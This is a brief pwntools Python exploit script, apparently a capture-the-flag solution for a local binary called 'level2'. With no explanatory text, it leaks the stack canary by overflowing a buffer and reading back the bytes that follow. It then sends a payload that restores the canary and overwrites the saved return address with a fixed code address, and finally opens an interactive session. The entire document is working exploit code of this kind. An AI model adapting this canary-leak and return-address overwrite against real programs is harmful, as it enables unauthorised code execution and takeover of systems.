from pwn import *
p = process('./level2')
offset = 0x24-0xC
p.send('a' * (offset + 1))
p.recvuntil('a' * (offset + 1))
canary = b'\x00' + p.recv(3)
payload  = b'a' * offset + canary + b'a' * 12 + b'\x16\x85\x04\x08'
p.send(payload)
p.recvuntil('a' * offset + '\n')
p.interactive()
